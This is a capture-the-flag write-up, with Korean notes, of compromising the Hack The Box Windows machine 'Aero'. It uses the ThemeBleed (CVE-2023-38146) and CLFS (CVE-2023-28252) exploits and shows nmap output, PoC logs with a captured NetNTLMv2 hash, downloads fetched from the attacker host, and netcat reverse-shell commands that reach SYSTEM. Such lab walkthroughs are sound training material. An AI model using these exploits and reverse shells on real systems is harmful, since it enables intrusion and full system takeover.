---
tags:
  - type/machine
  - platform/htb
  - os/windows
  - status/solved
  - tech/payload/revshell
type: machine
platform: htb
os: windows
ip: 10.129.229.128
ports: [80]
services: [http]
cves: [CVE-2023-28252, CVE-2023-38146]
status: solved
tech_count: 1
---

Nmap
```bash
┌──(kali㉿kali)-[~/HTB/aero]
└─$ nnmap 10.129.229.128                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 15:24 +0900
Nmap scan report for 10.129.229.128
Host is up (0.26s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Aero Theme Hub
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows 11 21H2 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   273.00 ms 10.10.14.1
2   273.18 ms 10.129.229.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.77 seconds
                                                               

```


테마 관련 웹페이지
![[Pasted image 20260318153321.png]]

POC 다운로드
```bash
┌──(kali㉿kali)-[~/HTB/aero]
└─$ git clone https://github.com/Jnnshschl/CVE-2023-38146.git
Cloning into 'CVE-2023-38146'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (19/19), done.
remote: Total 27 (delta 10), reused 20 (delta 6), pack-reused 0 (from 0)
Receiving objects: 100% (27/27), 845.11 KiB | 49.71 MiB/s, done.
Resolving deltas: 100% (10/10), done.


```

리버스쉘 대기 후 POC 실행
웹페이지에 choose file로 theme 파일 업로드 실행하면 작동함함
```bash
┌──(kali㉿kali)-[~/HTB/aero/CVE-2023-38146]
└─$ python themebleed.py -r 10.10.14.42 -p 4711
2026-03-18 16:27:02,734 INFO> ThemeBleed CVE-2023-38146 PoC [https://github.com/Jnnshschl]
2026-03-18 16:27:02,734 INFO> Credits to -> https://github.com/gabe-k/themebleed, impacket and cabarchive

2026-03-18 16:27:03,126 INFO> Compiled DLL: "./tb/Aero.msstyles_vrf_evil.dll"
2026-03-18 16:27:03,127 INFO> Theme generated: "evil_theme.theme"
2026-03-18 16:27:03,127 INFO> Themepack generated: "evil_theme.themepack"

2026-03-18 16:27:03,127 INFO> Remember to start netcat: rlwrap -cAr nc -lvnp 4711
2026-03-18 16:27:03,127 INFO> Starting SMB server: 10.10.14.42:445

2026-03-18 16:27:03,127 INFO> Config file parsed
2026-03-18 16:27:03,127 INFO> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2026-03-18 16:27:03,127 INFO> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2026-03-18 16:27:03,128 INFO> Config file parsed
2026-03-18 16:27:03,128 INFO> Config file parsed
2026-03-18 16:27:34,060 INFO> Incoming connection (10.129.229.128,62488)
2026-03-18 16:27:34,615 INFO> AUTHENTICATE_MESSAGE (AERO\sam.emerson,AERO)
2026-03-18 16:27:34,615 INFO> User AERO\sam.emerson authenticated successfully
2026-03-18 16:27:34,616 INFO> sam.emerson::AERO:aaaaaaaaaaaaaaaa:d22c5d65e375bfc5efb02a850304e04a:0101000000000000003721b0a8b6dc0146f0a73e72071f8a000000000100100043006b007a004400550067005a0063000300100043006b007a004400550067005a0063000200100048007300630079004900740053005600040010004800730063007900490074005300560007000800003721b0a8b6dc01060004000200000008003000300000000000000000000000002000005495e1a9257aeeb435fc2d94df09c8dcb132c21b4b6d14027ea7c6096680df020a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340032000000000000000000
2026-03-18 16:27:34,888 INFO> Connecting Share(1:IPC$)
2026-03-18 16:27:35,431 INFO> Connecting Share(2:tb)
2026-03-18 16:27:35,704 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 1]
2026-03-18 16:27:38,215 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 1]
2026-03-18 16:27:40,704 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 7]
2026-03-18 16:27:41,790 WARNING> Stage 1/3: "Aero.msstyles" [shareAccess: 5]
2026-03-18 16:27:45,597 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 7]
2026-03-18 16:27:46,685 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 1]
2026-03-18 16:27:49,896 INFO> Disconnecting Share(1:IPC$)
2026-03-18 16:27:54,304 WARNING> Stage 2/3: "Aero.msstyles_vrf.dll" [shareAccess: 7]
2026-03-18 16:27:55,401 WARNING> Stage 3/3: "Aero.msstyles_vrf.dll" [shareAccess: 5]

```

리버스쉘 연결 성공
```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4711
listening on [any] 4711 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.229.128] 62489
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 

```

user.txt 획득
```powershell
type user.txt
3e14b73431993a06d7760dd43b4b8f8e
PS C:\users\sam.emerson\Desktop> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::17c
   IPv6 Address. . . . . . . . . . . : dead:beef::4b6e:ccb7:242a:6c80
   Temporary IPv6 Address. . . . . . : dead:beef::405d:d084:f453:d7f9
   Link-local IPv6 Address . . . . . : fe80::d418:d331:b908:747d%13
   IPv4 Address. . . . . . . . . . . : 10.129.229.128
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%13
                                       10.129.0.1


```
![[Pasted image 20260318163029.png]]


### Privilege Escalation

C:\Users\sam.emerson\Documents 디렉토리에서 파일 발견
```bash
PS C:\users\sam.emerson\Documents> ls
ls


    Directory: C:\users\sam.emerson\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf                                           
-a----         9/26/2023   1:06 PM           1113 watchdog.ps1     
```

CVE-2023-28252
![[Pasted image 20260318163259.png]]

POC 다운로드

https://github.com/bkstephen/Compiled-PoC-Binary-For-CVE-2023-28252.git
```bash
┌──(kali㉿kali)-[~/HTB/aero/CVE-2023-38146]
└─$ git clone https://github.com/fortra/CVE-2023-28252       
Cloning into 'CVE-2023-28252'...
remote: Enumerating objects: 264, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 264 (delta 0), reused 0 (delta 0), pack-reused 261 (from 1)
Receiving objects: 100% (264/264), 55.19 MiB | 17.96 MiB/s, done.
Resolving deltas: 100% (74/74), done.

```


exploit을 위한 clfs_eop.exe, nc64.exe 파일 이동
```powershell
PS C:\users\sam.emerson\Documents> iwr http://10.10.14.42/clfs_eop.exe -outfile clfs_eop.exe
iwr http://10.10.14.42/clfs_eop.exe -outfile clfs_eop.exe


PS C:\users\sam.emerson\Documents> iwr http://10.10.14.42/nc64.exe -outfile nc64.exe
iwr http://10.10.14.42/nc64.exe -outfile nc64.exe

```


POC 실행
```powersheel

PS C:\users\sam.emerson\Documents> .\clfs_eop.exe ".\nc64.exe 10.10.14.42 4444 -e cmd.exe" 1208 1
.\clfs_eop.exe ".\nc64.exe 10.10.14.42 4444 -e cmd.exe" 1208 1


ARGUMENTS
[+] TOKEN OFFSET 4b8
[+] FLAG 1


VIRTUAL ADDRESSES AND OFFSETS
[+] NtFsControlFile Address --> 00007FF9B8E24240
[+] pool NpAt VirtualAddress -->FFFFAF892CEFE000
[+] MY EPROCESSS FFFFC584C92D60C0
[+] SYSTEM EPROCESSS FFFFC584C16EF040
[+] _ETHREAD ADDRESS FFFFC584CA4E7080
[+] PREVIOUS MODE ADDRESS FFFFC584CA4E72B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF80265613220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF8026562BFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF80261343010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF802619C87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF802613DBD00


PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\68
[+] Base file path = C:\Users\Public\68.blf
[+] Container file name path = C:\Users\Public\.p_68
Last kernel CLFS address = FFFFAF891A75E000
numero de tags CLFS founded 11

Last kernel CLFS address = FFFFAF891DEB8000
numero de tags CLFS founded 1

[+] Log file handle: 0000000000000104
[+] Pool CLFS kernel address: FFFFAF891DEB8000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: FFFFAF89184654FE
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM


```

리버스쉘 획득
```bash
┌──(kali㉿kali)-[~/OSCP/git/nc.exe]
└─$ rlwrap nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.229.128] 62495
Microsoft Windows [Version 10.0.22000.1761]
(c) Microsoft Corporation. All rights reserved.

C:\users\sam.emerson\Documents>whoami
whoami
nt authority\system


```

root.txt 획득
![[Pasted image 20260318164305.png]]